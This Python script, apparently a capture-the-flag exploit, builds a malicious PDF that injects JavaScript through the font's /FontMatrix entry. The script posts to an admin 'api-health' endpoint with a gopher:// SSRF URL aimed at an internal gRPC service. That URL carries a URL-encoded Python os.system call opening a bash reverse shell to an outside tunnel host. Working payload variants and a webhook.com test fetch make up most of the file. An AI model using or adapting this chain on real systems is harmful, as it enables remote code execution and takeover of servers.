#!/usr/bin/env python3

import sys

def generate_payload(payload):
    backslash_char = "\\"
    fmt_payload = payload.replace('(', '\\(').replace(')', '\\)')
    font_matrix = f"/FontMatrix [0.1 0 0 0.1 0 (1{backslash_char});\n" + f"{fmt_payload}" + "\n//)]"
    return f"""
%PDF-1.4
%DUMMY
8 0 obj
<<
/PatternType 2
/Shading<<
  /Function<<
    /Domain[0 1]
    /C0[0 0 1]
    /C1[1 0.6 0]
    /N 1
    /FunctionType 2
  >>
  /ShadingType 2
  /Coords[46 400 537 400]
  /Extend[false false]
  /ColorSpace/DeviceRGB
>>
/Type/Pattern
>>
endobj
5 0 obj
<<
/Widths[573 0 582 0 548 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 573 0 573 0 341]
/Type/Font
/BaseFont/PAXEKO+SourceSansPro-Bold
/LastChar 102
/Encoding/WinAnsiEncoding
{font_matrix}
/Subtype/Type1
/FirstChar 65
/FontDescriptor 9 0 R
>>
endobj
2 0 obj
<<
/Kids[3 0 R]
/Type/Pages
/Count 1
>>
endobj
9 0 obj
<<
/Type/FontDescriptor
/ItalicAngle 0
/Ascent 751
/FontBBox[-6 -12 579 713]
/FontName/PAXEKO+SourceSansPro-Bold
/StemV 100
/CapHeight 713
/Flags 32
/FontFile3 10 0 R
/Descent -173
/MissingWidth 250
>>
endobj
6 0 obj
<<
/Length 128
>>
stream
47 379 489 230 re S
/Pattern cs
BT
  50 500 Td
  117 TL
  /F1 150 Tf
  /P1 scn
  (AbCdEf) Tj
  /P2 scn
  (AbCdEf) '
ET
endstream
endobj
3 0 obj
<<
/Type/Page
/Resources 4 0 R
/Contents 6 0 R
/Parent 2 0 R
/MediaBox[0 0 595.2756 841.8898]
>>
endobj
10 0 obj
<<
/Length 800
/Subtype/Type2
>>
stream

endstream
endobj
7 0 obj
<<
/PatternType 1
/Matrix[1 0 0 1 50 0]
/Length 58
/TilingType 1
/BBox[0 0 16 16]
/YStep 16
/PaintType 1
/Resources<<
>>
/XStep 16
>>
stream
0.65 g
0 0 16 16 re f
0.15 g
0 0 8 8 re f
8 8 8 8 re f
endstream
endobj
4 0 obj
<<
/Pattern<<
  /P1 7 0 R
  /P2 8 0 R
>>
/Font<<
  /F1 5 0 R
>>
>>
endobj
1 0 obj
<<
/Pages 2 0 R
/Type/Catalog
/OpenAction[3 0 R /Fit]
>>
endobj

xref
0 11
0000000000 65535 f
0000002260 00000 n
0000000522 00000 n
0000000973 00000 n
0000002178 00000 n
0000000266 00000 n
0000000794 00000 n
0000001953 00000 n
0000000015 00000 n
0000000577 00000 n
0000001085 00000 n
trailer
<<
/ID[(DUMMY) (DUMMY)]
/Root 1 0 R
/Size 11
>>
startxref
2333
%%EOF
"""

# fail
payload = """
const formData = new URLSearchParams();
formData.append('url', 'gopher://127.0.0.1:50051/_%50%52%49%20%2a%20%48%54%54%50%2f%32%2e%30%0d%0a%0d%0a%53%4d%0d%0a%0d%0a%00%00%00%04%00%00%00%00%00%00%00%00%04%01%00%00%00%00%00%00%6f%01%04%00%00%00%01%83%86%45%9a%62%bb%0f%25%a4%4a%fa%ec%3c%96%91%3b%8b%67%73%10%ac%5f%2c%76%cd%b8%b6%77%31%0b%41%8c%0b%a2%5c%4d%2e%f0%17%0d%c6%9a%69%af%5f%8b%1d%75%d0%62%0d%26%3d%4c%4d%65%64%7a%95%9a%ca%c9%6d%94%31%dc%2b%be%bb%2a%4d%65%64%5a%63%b0%15%dc%0a%e0%40%02%74%65%86%4d%83%35%05%b1%1f%40%8e%9a%ca%c8%b0%c8%42%d6%95%8b%51%0f%21%aa%9b%83%9b%d9%ab%00%00%89%00%01%00%00%00%01%00%00%00%00%84%0a%81%01%0a%0d%70%72%69%63%65%5f%66%6f%72%6d%75%6c%61%12%70%0a%6e%5f%5f%69%6d%70%6f%72%74%5f%5f%28%22%6f%73%22%29%2e%73%79%73%74%65%6d%28%22%62%61%73%68%20%2d%63%20%5c%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%64%6c%70%71%62%2d%35%39%2d%31%35%33%2d%32%33%38%2d%36%36%2e%72%75%6e%2e%70%69%6e%67%67%79%2d%66%72%65%65%2e%6c%69%6e%6b%2f%34%33%34%34%35%20%30%3e%26%31%5c%22%22%29%00%00%08%06%01%00%00%00%00%ef%b4%36%b9%6a%d8%57%5c%00%00%04%08%00%00%00%00%00%00%00%00%05%00%00%08%06%00%00%00%00%00%02%04%10%10%09%0e%07%07'); 

fetch('http://127.0.0.1:1337/admin/api-health', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: formData.toString(),
    credentials: 'include'
});
"""

# success
payload1 = """
if (!window.pwned) {
    window.pwned = true;
    let form = document.createElement('form');
    form.action = 'http://127.0.0.1:1337/admin/api-health';
    form.method = 'POST';
    let input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'url';
    input.value = 'gopher://127.0.0.1:50051/_%50%52%49%20%2a%20%48%54%54%50%2f%32%2e%30%0d%0a%0d%0a%53%4d%0d%0a%0d%0a%00%00%00%04%00%00%00%00%00%00%00%00%04%01%00%00%00%00%00%00%6f%01%04%00%00%00%01%83%86%45%9a%62%bb%0f%25%a4%4a%fa%ec%3c%96%91%3b%8b%67%73%10%ac%5f%2c%76%cd%b8%b6%77%31%0b%41%8c%0b%a2%5c%4d%2e%f0%17%0d%c6%9a%69%af%5f%8b%1d%75%d0%62%0d%26%3d%4c%4d%65%64%7a%95%9a%ca%c9%6d%94%31%dc%2b%be%bb%2a%4d%65%64%5a%63%b0%15%dc%0a%e0%40%02%74%65%86%4d%83%35%05%b1%1f%40%8e%9a%ca%c8%b0%c8%42%d6%95%8b%51%0f%21%aa%9b%83%9b%d9%ab%00%00%89%00%01%00%00%00%01%00%00%00%00%84%0a%81%01%0a%0d%70%72%69%63%65%5f%66%6f%72%6d%75%6c%61%12%70%0a%6e%5f%5f%69%6d%70%6f%72%74%5f%5f%28%22%6f%73%22%29%2e%73%79%73%74%65%6d%28%22%62%61%73%68%20%2d%63%20%5c%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%64%6c%70%71%62%2d%35%39%2d%31%35%33%2d%32%33%38%2d%36%36%2e%72%75%6e%2e%70%69%6e%67%67%79%2d%66%72%65%65%2e%6c%69%6e%6b%2f%34%33%34%34%35%20%30%3e%26%31%5c%22%22%29%00%00%08%06%01%00%00%00%00%ef%b4%36%b9%6a%d8%57%5c%00%00%04%08%00%00%00%00%00%00%00%00%05%00%00%08%06%00%00%00%00%00%02%04%10%10%09%0e%07%07';
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
}
"""

# for checking
payload2= """fetch('http://webhook.com')"""

if __name__ == "__main__":
    print("[+] Created malicious PDF file: poc.pdf")
    print("[+] Open the file with the vulnerable application to trigger the exploit.")

    payload = generate_payload(payload1)
    with open("poc.pdf", "w") as f:
        f.write(payload)

    sys.exit(0)